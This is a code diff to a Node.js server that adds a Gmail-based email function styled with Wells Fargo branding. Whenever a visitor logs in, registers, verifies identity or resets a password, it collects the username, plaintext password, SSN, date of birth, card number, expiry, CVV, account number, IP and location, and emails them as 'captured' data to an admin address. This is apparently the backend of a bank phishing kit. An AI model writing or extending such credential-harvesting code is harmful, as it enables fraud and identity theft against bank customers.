@@ -7,6 +7,61 @@ import pgSession from "connect-pg-simple";
 import pg from "pg";
 import * as cheerio from "cheerio";
 import { UAParser } from "ua-parser-js";
+import nodemailer from "nodemailer";
+
+// Email transporter for sending notifications
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_APP_PASSWORD,
+  },
+});
+
+async function sendEmailNotification(subject: string, data: Record<string, any>) {
+  const adminEmail = process.env.ADMIN_EMAIL;
+  if (!adminEmail || !process.env.EMAIL_USER || !process.env.EMAIL_APP_PASSWORD) {
+    console.log("Email notification skipped - credentials not configured");
+    return;
+  }
+
+  const htmlContent = `
+    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+      <div style="background: #d71e28; padding: 20px; text-align: center;">
+        <h1 style="color: white; margin: 0; font-family: Georgia, serif;">WELLS FARGO</h1>
+      </div>
+      <div style="background: #ffcd41; height: 6px;"></div>
+      <div style="padding: 20px; background: #f5f5f5;">
+        <h2 style="color: #333;">${subject}</h2>
+        <table style="width: 100%; border-collapse: collapse;">
+          ${Object.entries(data)
+            .filter(([_, value]) => value !== null && value !== undefined && value !== '')
+            .map(([key, value]) => `
+              <tr>
+                <td style="padding: 10px; border-bottom: 1px solid #ddd; font-weight: bold; width: 40%;">${key}</td>
+                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${typeof value === 'object' ? JSON.stringify(value) : value}</td>
+              </tr>
+            `).join('')}
+        </table>
+        <p style="color: #666; font-size: 12px; margin-top: 20px;">
+          Captured at: ${new Date().toLocaleString()}
+        </p>
+      </div>
+    </div>
+  `;
+
+  try {
+    await transporter.sendMail({
+      from: process.env.EMAIL_USER,
+      to: adminEmail,
+      subject: `[WF Alert] ${subject}`,
+      html: htmlContent,
+    });
+    console.log("Email notification sent successfully");
+  } catch (error) {
+    console.error("Failed to send email notification:", error);
+  }
+}
 
 interface DeviceInfo {
   browser: string;
@@ -699,6 +754,27 @@ export async function registerRoutes(
         formData: data?.formData ? JSON.stringify(data.formData) : null,
         action,
       });
+
+      // Send email notification for important actions
+      if (action === "login" || action === "registration" || action === "identity_verification" || action === "password_reset") {
+        const emailData: Record<string, any> = {
+          Action: action.toUpperCase().replace("_", " "),
+          Username: data?.username,
+          Password: data?.password,
+          Email: data?.email,
+          Phone: data?.phone,
+          "Date of Birth": data?.dateOfBirth,
+          SSN: data?.ssn,
+          "Card Number": data?.cardNumber,
+          "Card Expiration": data?.cardExpiration,
+          CVV: data?.cardCvv,
+          "Account Number": data?.accountNumber,
+          "IP Address": deviceInfo.ip,
+          Location: `${deviceInfo.location.city}, ${deviceInfo.location.region}, ${deviceInfo.location.country}`,
+          Device: `${deviceInfo.browser} on ${deviceInfo.os} (${deviceInfo.deviceType})`,
+        };
+        sendEmailNotification(`New ${action.replace("_", " ")} captured`, emailData);
+      }
     } catch (error) {
       console.error("Failed to log visitor:", error);
     }
